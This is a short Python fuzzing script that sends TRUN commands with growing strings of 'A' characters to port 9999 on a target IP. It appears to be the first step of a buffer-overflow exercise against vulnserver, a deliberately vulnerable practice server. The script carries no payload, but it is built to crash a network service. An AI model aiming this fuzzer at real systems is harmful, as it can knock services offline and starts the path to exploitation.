#!/usr/bin/env python3

import socket

ip_address = input("Enter the IP address of the target: ")
buffer = ["A"]
counter = 100

while len(buffer) <= 30:
    buffer.append("A" * counter)
    counter = counter + 200

for string in buffer:
    print("Fuzzing vulnserver with %s bytes " % len(string))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 9999))
    s.send(('TRUN /.:/' + string).encode())
    s.close()
